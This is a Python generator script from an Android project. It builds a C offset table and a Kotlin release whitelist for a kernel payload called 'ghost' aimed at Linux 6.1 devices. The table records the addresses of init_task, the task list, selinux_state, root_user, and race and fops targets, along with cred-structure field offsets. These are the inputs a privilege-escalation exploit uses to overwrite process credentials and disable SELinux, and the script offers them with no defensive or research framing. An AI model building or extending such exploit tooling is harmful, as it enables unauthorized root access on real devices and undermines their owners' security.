#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""从 ServerProfiles.kt + payload/ghost6.1/calib.json 生成：
  · payload/ghost6.1/map_6.1.h                 —— C 侧档案表
  · app/src/main/kotlin/com/extractkit/app/GhostCalibrated.kt —— App 侧白名单

规则（m24099「不匹配内核就不跑」）：
  · 只收 6.1.* 档案；
  · 只有 calib.json 里给出**完整标定**（fp/init_task/task_tasks/fops/race）的 release
    才写成真值并进 App 白名单；其余一律写 0（= 未标定，payload 会 exit 2 拒跑）；
  · ghost_map_pick 只做精确/前缀命中，**不命中返回 NULL**，绝不拿别的 build 顶。
"""
import json, os, re, sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
KT = os.path.join(ROOT, "app", "src", "main", "kotlin", "com", "extractkit", "app", "ServerProfiles.kt")
OUT = os.path.join(ROOT, "payload", "ghost6.1", "map_6.1.h")
CALIB = os.path.join(ROOT, "payload", "ghost6.1", "calib.json")
KOUT = os.path.join(ROOT, "app", "src", "main", "kotlin", "com", "extractkit", "app", "GhostCalibrated.kt")

TASK_OFF = (0x838, 0x840, 0xe0, 0xe4, 0x850)


def parse(text):
    out = []
    for m in re.finditer(r'ConfigGen\.Profile\((.*?)\n        \),', text, re.S):
        body = m.group(1)
        rel = re.search(r'release = "([^"]+)"', body)
        if not rel:
            continue
        rel = rel.group(1)
        if not rel.startswith("6.1."):
            continue
        syms = {}
        for sm in re.finditer(r'"(\w+)" to 0x([0-9A-Fa-f]+)uL', body):
            syms[sm.group(1)] = int(sm.group(2), 16)
        out.append((rel, syms))
    return out


def complete(c):
    if not c:
        return False
    if len(c.get("fp", [])) < 3:
        return False
    if len(c.get("race", [])) != 5 or not all(c["race"]):
        return False
    if len(c.get("fops", [])) != 6 or not all(c["fops"]):
        return False
    return bool(c.get("init_task")) and bool(c.get("task_tasks"))


def main():
    text = open(KT, encoding="utf-8").read()
    profs = parse(text)
    if not profs:
        print("[!] no 6.1 profile found")
        return 1
    seen, uniq = set(), []
    for rel, syms in profs:
        if rel in seen:
            continue
        seen.add(rel)
        uniq.append((rel, syms))

    calib = {}
    if os.path.exists(CALIB):
        try:
            calib = json.load(open(CALIB, encoding="utf-8"))
        except Exception as e:
            print("[!] calib.json parse failed: %s" % e)
            calib = {}

    # calib.json 里标定过、但 ServerProfiles.kt 尚未收录的 6.1 release 也要进表
    for rel in sorted(calib):
        if not rel.startswith("6.1."):
            continue
        if rel in seen:
            continue
        seen.add(rel)
        uniq.append((rel, {}))

    L = ["/* 自动生成：tools/gen-ghost-map.py —— 勿手改 */",
         "#ifndef GHOST_MAP_61_H",
         "#define GHOST_MAP_61_H",
         '#include "ghost.h"', ""]
    ready = []
    for i, (rel, syms) in enumerate(uniq):
        c = calib.get(rel)
        if complete(c):
            ready.append(rel)
            fp = c["fp"]
            L.append("static const ghost_fp fp_%d[] = {" % i)
            for f in fp:
                L.append("    { 0x%XULL, (int64_t)0x%XLL }," % (f["key"], int(f["delta"]) & 0xFFFFFFFFFFFFFFFF))
            L.append("};")
        else:
            L.append("static const ghost_fp fp_%d[] = { {0, 0} };" % i)
    L.append("")
    L.append("static const ghost_map g_maps[] = {")
    for i, (rel, syms) in enumerate(uniq):
        c = calib.get(rel)
        ok = complete(c)
        L.append("    {")
        L.append('        .release = "%s",' % rel)
        if ok:
            L.append("        .init_task = 0x%XULL," % c["init_task"])
            L.append("        .fops = { %s }," % ", ".join("0x%XULL" % v for v in c["fops"]))
            L.append("        .race = { %s }," % ", ".join("0x%XULL" % v for v in c["race"]))
            L.append("        .task_tasks = 0x%X," % c["task_tasks"])
            tr, cr, pid, tgid, comm = (c.get("task_off") or list(TASK_OFF))
        else:
            L.append("        .init_task = 0, /* 未标定 */")
            L.append("        .fops = GHOST_FOPS_NONE, /* 未标定 */")
            L.append("        .race = GHOST_RACE_NONE, /* 未标定 */")
            L.append("        .task_tasks = 0, /* 未标定 */")
            tr, cr, pid, tgid, comm = TASK_OFF
        L.append("        .selinux_state = 0x%XULL," % syms.get("selinux_state", 0))
        L.append("        .root_user = 0x%XULL," % syms.get("root_user", 0))
        L.append("        .init_user_ns = 0x%XULL," % syms.get("init_user_ns", 0))
        L.append("        .task_real_cred = 0x%X, .task_cred = 0x%X," % (tr, cr))
        L.append("        .task_pid = 0x%X, .task_tgid = 0x%X, .task_comm = 0x%X," % (pid, tgid, comm))
        L.append("        .cred_uid = 0x04, .cred_securebits = 0x24, .cred_caps = 0x28,")
        L.append("        .cred_security = 0x78, .cred_size = 0xb0,")
        L.append("        .nfp = %d, .fp = fp_%d," % (len(calib[rel]["fp"]) if ok else 0, i))
        L.append("    },")
    L.append("};")
    L.append("")
    L.append("#define GHOST_MAP_COUNT ((int)(sizeof(g_maps)/sizeof(g_maps[0])))")
    L.append("""
/* 只认命中：profile 与 uname -r 前缀相等且下一个字符是 '-' 或结束。
 * 不命中返回 NULL —— 调用方必须拒跑，绝不用别的 build 的常量顶替。 */
static inline const ghost_map *ghost_map_pick(const char *release)
{
    if (!release || !*release) return 0;
    for (int i = 0; i < GHOST_MAP_COUNT; i++) {
        size_t n = strlen(g_maps[i].release);
        if (strncmp(g_maps[i].release, release, n) != 0) continue;
        if (release[n] == 0 || release[n] == '-') return &g_maps[i];
    }
    return 0;
}
""")
    L.append("#endif")
    open(OUT, "w", encoding="utf-8", newline="\n").write("\n".join(L))

    K = ["package com.extractkit.app", "",
         "// 自动生成：tools/gen-ghost-map.py —— 勿手改",
         "internal object GhostCalibrated {",
         "    /** 已完整标定（fp/init_task/tasks/fops/race）的内核 release。空集 = 任何内核都不跑 ghost。 */"]
    if ready:
        K.append("    val RELEASES: Set<String> = setOf(")
        for r in ready:
            K.append('        "%s",' % r)
        K.append("    )")
    else:
        K.append("    val RELEASES: Set<String> = emptySet()")
    K.append("}")
    open(KOUT, "w", encoding="utf-8", newline="\n").write("\n".join(K) + "\n")

    print("[ok] %s  profiles=%d calibrated=%d" % (OUT, len(uniq), len(ready)))
    for r in ready:
        print("      calibrated: %s" % r)
    print("[ok] %s  releases=%d" % (KOUT, len(ready)))
    return 0


if __name__ == "__main__":
    sys.exit(main())
